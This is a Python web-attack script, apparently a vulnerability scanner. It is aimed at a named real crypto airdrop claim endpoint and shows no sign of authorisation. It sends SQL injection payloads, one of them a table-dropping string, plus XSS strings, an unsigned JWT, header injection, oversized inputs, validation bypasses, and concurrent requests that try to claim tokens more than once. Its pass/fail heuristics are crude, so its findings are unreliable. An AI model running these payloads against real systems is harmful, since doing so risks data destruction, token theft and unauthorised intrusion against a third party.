#!/usr/bin/env python3
"""
ShadowScan Airdrop Deep Testing Module
Untuk testing lebih mendalam pada claim functionality
"""

import asyncio
import aiohttp
import json
import time
import random
import string
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from urllib.parse import urljoin
import hashlib
import hmac
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class DeepTestResult:
    """Deep test result"""
    test_name: str
    success: bool
    details: str
    proof: str
    severity: str = "Medium"
    recommendation: str = ""

class AirdropDeepTester:
    """Deep testing untuk airdrop functionality"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.test_results: List[DeepTestResult] = []
        
    async def run_deep_tests(self) -> List[DeepTestResult]:
        """Jalankan semua deep tests"""
        logger.info("🔍 Starting deep security tests...")
        
        tests = [
            self.test_sql_injection,
            self.test_xss_vulnerability,
            self.test_csrf_protection,
            self.test_jwt_manipulation,
            self.test_parameter_pollution,
            self.test_header_injection,
            self.test_buffer_overflow,
            self.test_integer_overflow,
            self.test_race_condition,
            self.test_bypass_validation
        ]
        
        for test in tests:
            try:
                result = await test()
                if result:
                    self.test_results.append(result)
                    logger.info(f"✅ Test completed: {result.test_name}")
            except Exception as e:
                logger.error(f"❌ Test failed: {test.__name__} - {e}")
        
        return self.test_results
    
    async def test_sql_injection(self) -> Optional[DeepTestResult]:
        """Test SQL injection vulnerabilities"""
        try:
            # SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' OR '1'='1",
                "admin'--"
            ]
            
            endpoint = f"{self.target_url}/api/claim"
            
            for payload in payloads:
                test_data = {
                    "walletAddress": payload,
                    "amount": "100",
                    "signature": "test"
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, timeout=10) as response:
                            if response.status == 200:
                                # Check if SQL error in response
                                text = await response.text()
                                if any(error in text.lower() for error in ['sql', 'mysql', 'postgresql', 'sqlite']):
                                    return DeepTestResult(
                                        test_name="SQL Injection",
                                        success=True,
                                        details=f"SQL error revealed with payload: {payload}",
                                        proof=f"Response contained SQL error: {text[:100]}",
                                        severity="Critical",
                                        recommendation="Use parameterized queries and input sanitization"
                                    )
                except:
                    continue
            
            return DeepTestResult(
                test_name="SQL Injection",
                success=False,
                details="No SQL injection vulnerabilities detected",
                proof="Tested with common SQL injection payloads",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="SQL Injection",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_xss_vulnerability(self) -> Optional[DeepTestResult]:
        """Test XSS vulnerabilities"""
        try:
            # XSS payloads
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ]
            
            endpoint = f"{self.target_url}/api/claim"
            
            for payload in payloads:
                test_data = {
                    "walletAddress": payload,
                    "amount": "100",
                    "signature": "test"
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if payload in text:
                                    return DeepTestResult(
                                        test_name="XSS Vulnerability",
                                        success=True,
                                        details=f"XSS payload reflected in response: {payload}",
                                        proof=f"Payload found in response: {text[:200]}",
                                        severity="High",
                                        recommendation="Implement proper input sanitization and output encoding"
                                    )
                except:
                    continue
            
            return DeepTestResult(
                test_name="XSS Vulnerability",
                success=False,
                details="No XSS vulnerabilities detected",
                proof="Tested with common XSS payloads",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="XSS Vulnerability",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_csrf_protection(self) -> Optional[DeepTestResult]:
        """Test CSRF protection"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Test without CSRF token
            test_data = {
                "walletAddress": "0x1234567890123456789012345678901234567890",
                "amount": "100"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(endpoint, json=test_data, timeout=10) as response:
                    if response.status == 200:
                        return DeepTestResult(
                            test_name="CSRF Protection",
                            success=True,
                            details="Request accepted without CSRF token",
                            proof=f"Response status: {response.status}",
                            severity="High",
                            recommendation="Implement CSRF tokens for state-changing operations"
                        )
            
            return DeepTestResult(
                test_name="CSRF Protection",
                success=False,
                details="CSRF protection implemented",
                proof="Request blocked without proper CSRF token",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="CSRF Protection",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_jwt_manipulation(self) -> Optional[DeepTestResult]:
        """Test JWT token manipulation"""
        try:
            # Test with invalid JWT tokens
            jwt_payloads = [
                "invalid.jwt.token",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.payload",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                ""  # Empty token
            ]
            
            endpoint = f"{self.target_url}/api/claim"
            
            for token in jwt_payloads:
                headers = {"Authorization": f"Bearer {token}"}
                test_data = {
                    "walletAddress": "0x1234567890123456789012345678901234567890",
                    "amount": "100"
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                return DeepTestResult(
                                    test_name="JWT Manipulation",
                                    success=True,
                                    details=f"Invalid JWT token accepted: {token}",
                                    proof=f"Response status: {response.status}",
                                    severity="High",
                                    recommendation="Implement proper JWT validation and signature verification"
                                )
                except:
                    continue
            
            return DeepTestResult(
                test_name="JWT Manipulation",
                success=False,
                details="JWT validation implemented correctly",
                proof="Invalid JWT tokens rejected",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="JWT Manipulation",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_parameter_pollution(self) -> Optional[DeepTestResult]:
        """Test HTTP parameter pollution"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Test with duplicate parameters
            test_data = {
                "walletAddress": "0x1234567890123456789012345678901234567890",
                "amount": "100",
                "signature": "test_signature"
            }
            
            # Add duplicate parameter
            polluted_data = test_data.copy()
            polluted_data["walletAddress"] = "0xmaliciousaddress12345678901234567890"
            
            async with aiohttp.ClientSession() as session:
                async with session.post(endpoint, json=polluted_data, timeout=10) as response:
                    if response.status == 200:
                        text = await response.text()
                        if "maliciousaddress" in text:
                            return DeepTestResult(
                                test_name="Parameter Pollution",
                                success=True,
                                details="Parameter pollution successful - second parameter processed",
                                proof=f"Malicious address found in response: {text[:200]}",
                                severity="Medium",
                                recommendation="Validate parameter uniqueness and processing order"
                            )
            
            return DeepTestResult(
                test_name="Parameter Pollution",
                success=False,
                details="Parameter pollution protection implemented",
                proof="Duplicate parameters handled correctly",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Parameter Pollution",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_header_injection(self) -> Optional[DeepTestResult]:
        """Test HTTP header injection"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Malicious headers
            malicious_headers = [
                {"User-Agent": "Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1"},
                {"Referer": "https://trusted-site.com\r\nX-Forwarded-Host: evil.com"},
                {"X-Forwarded-For": "127.0.0.1, 192.168.1.1"},
                {"Host": "airdrop.boundless.network\r\nX-Original-Host: evil.com"}
            ]
            
            for headers in malicious_headers:
                test_data = {
                    "walletAddress": "0x1234567890123456789012345678901234567890",
                    "amount": "100"
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if any(indicator in text.lower() for indicator in ['evil', 'malicious', '127.0.0.1']):
                                    return DeepTestResult(
                                        test_name="Header Injection",
                                        success=True,
                                        details=f"Header injection successful with headers: {headers}",
                                        proof=f"Malicious content in response: {text[:200]}",
                                        severity="Medium",
                                        recommendation="Validate and sanitize all HTTP headers"
                                    )
                except:
                    continue
            
            return DeepTestResult(
                test_name="Header Injection",
                success=False,
                details="Header injection protection implemented",
                proof="Malicious headers rejected",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Header Injection",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_buffer_overflow(self) -> Optional[DeepTestResult]:
        """Test buffer overflow vulnerabilities"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Large input payloads
            large_inputs = [
                "A" * 10000,  # 10KB
                "A" * 100000,  # 100KB
                "A" * 1000000,  # 1MB
                "0x" + "A" * 10000,  # Large hex string
                "🔥" * 10000  # Unicode characters
            ]
            
            for large_input in large_inputs:
                test_data = {
                    "walletAddress": large_input,
                    "amount": "100",
                    "signature": "test"
                }
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, timeout=30) as response:
                            if response.status == 200:
                                # Server accepted unusually large input
                                return DeepTestResult(
                                    test_name="Buffer Overflow",
                                    success=True,
                                    details=f"Server accepted unusually large input: {len(large_input)} characters",
                                    proof=f"Response status: {response.status}",
                                    severity="High",
                                    recommendation="Implement input length validation and limits"
                                )
                except:
                    # Timeout or error might indicate protection
                    continue
            
            return DeepTestResult(
                test_name="Buffer Overflow",
                success=False,
                details="Buffer overflow protection implemented",
                proof="Large inputs properly rejected or handled",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Buffer Overflow",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_integer_overflow(self) -> Optional[DeepTestResult]:
        """Test integer overflow vulnerabilities"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Integer overflow payloads
            overflow_payloads = [
                {"amount": "999999999999999999999999999999"},
                {"amount": "-999999999999999999999999999999"},
                {"amount": "0"},
                {"amount": "1e100"},
                {"amount": "-1e100"},
                {"amount": "2147483648"},  # 32-bit signed int overflow
                {"amount": "9223372036854775808"}  # 64-bit signed int overflow
            ]
            
            for payload in overflow_payloads:
                test_data = {
                    "walletAddress": "0x1234567890123456789012345678901234567890",
                    "signature": "test"
                }
                test_data.update(payload)
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if "success" in text.lower():
                                    return DeepTestResult(
                                        test_name="Integer Overflow",
                                        success=True,
                                        details=f"Integer overflow payload accepted: {payload}",
                                        proof=f"Response indicated success: {text[:200]}",
                                        severity="Critical",
                                        recommendation="Implement proper integer validation and bounds checking"
                                    )
                except:
                    continue
            
            return DeepTestResult(
                test_name="Integer Overflow",
                success=False,
                details="Integer overflow protection implemented",
                proof="Overflow values properly rejected",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Integer Overflow",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_race_condition(self) -> Optional[DeepTestResult]:
        """Test race condition vulnerabilities"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Test concurrent requests
            test_data = {
                "walletAddress": "0x1234567890123456789012345678901234567890",
                "amount": "100",
                "signature": "test_signature"
            }
            
            async def make_request():
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=test_data, timeout=10) as response:
                            return response.status
                except:
                    return 500
            
            # Send concurrent requests
            tasks = [make_request() for _ in range(10)]
            results = await asyncio.gather(*tasks)
            
            # Check if multiple requests succeeded
            success_count = sum(1 for status in results if status == 200)
            
            if success_count > 1:
                return DeepTestResult(
                    test_name="Race Condition",
                    success=True,
                    details=f"Race condition detected - {success_count} requests succeeded",
                    proof=f"Concurrent requests: {results}",
                    severity="High",
                    recommendation="Implement proper locking and deduplication mechanisms"
                )
            
            return DeepTestResult(
                test_name="Race Condition",
                success=False,
                details="Race condition protection implemented",
                proof=f"Only 1 request succeeded out of {len(results)} concurrent requests",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Race Condition",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )
    
    async def test_bypass_validation(self) -> Optional[DeepTestResult]:
        """Test validation bypass techniques"""
        try:
            endpoint = f"{self.target_url}/api/claim"
            
            # Bypass techniques
            bypass_payloads = [
                # JSON bypass
                {"walletAddress": "0x123", "amount": "100", "signature": None},
                {"walletAddress": None, "amount": "100", "signature": "test"},
                # Empty values
                {"walletAddress": "", "amount": "100", "signature": "test"},
                {"walletAddress": "0x123", "amount": "", "signature": "test"},
                # Unicode bypass
                {"walletAddress": "0x123\u0000", "amount": "100", "signature": "test"},
                # Case manipulation
                {"walletAddress": "0X123", "amount": "100", "signature": "test"},
                # Type confusion
                {"walletAddress": 123, "amount": "100", "signature": "test"},
                {"walletAddress": "0x123", "amount": 100, "signature": "test"}
            ]
            
            for payload in bypass_payloads:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(endpoint, json=payload, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if "success" in text.lower():
                                    return DeepTestResult(
                                        test_name="Validation Bypass",
                                        success=True,
                                        details=f"Validation bypass successful with payload: {payload}",
                                        proof=f"Response indicated success: {text[:200]}",
                                        severity="High",
                                        recommendation="Implement strict type and format validation"
                                    )
                except:
                    continue
            
            return DeepTestResult(
                test_name="Validation Bypass",
                success=False,
                details="Validation bypass protection implemented",
                proof="Invalid inputs properly rejected",
                severity="Info"
            )
            
        except Exception as e:
            return DeepTestResult(
                test_name="Validation Bypass",
                success=False,
                details=f"Test failed: {str(e)}",
                proof="Error during testing",
                severity="Info"
            )

async def main():
    """Main function for deep testing"""
    target_url = "https://airdrop.boundless.network/"
    
    tester = AirdropDeepTester(target_url)
    results = await tester.run_deep_tests()
    
    # Print results
    print("\n" + "="*80)
    print("🔍 AIRDROP DEEP SECURITY TEST RESULTS")
    print("="*80)
    
    for result in results:
        severity_color = {
            "Critical": "🔴",
            "High": "🟠",
            "Medium": "🟡",
            "Low": "🟢",
            "Info": "🔵"
        }.get(result.severity, "⚪")
        
        print(f"\n{severity_color} {result.test_name}")
        print(f"   Success: {'✅' if result.success else '❌'}")
        print(f"   Details: {result.details}")
        print(f"   Proof: {result.proof}")
        if result.recommendation:
            print(f"   Recommendation: {result.recommendation}")
    
    # Save results
    with open('deep_test_results.json', 'w') as f:
        json.dump([{
            'test_name': r.test_name,
            'success': r.success,
            'details': r.details,
            'proof': r.proof,
            'severity': r.severity,
            'recommendation': r.recommendation
        } for r in results], f, indent=2)
    
    print(f"\n📄 Deep test results saved to: deep_test_results.json")

if __name__ == "__main__":
    asyncio.run(main())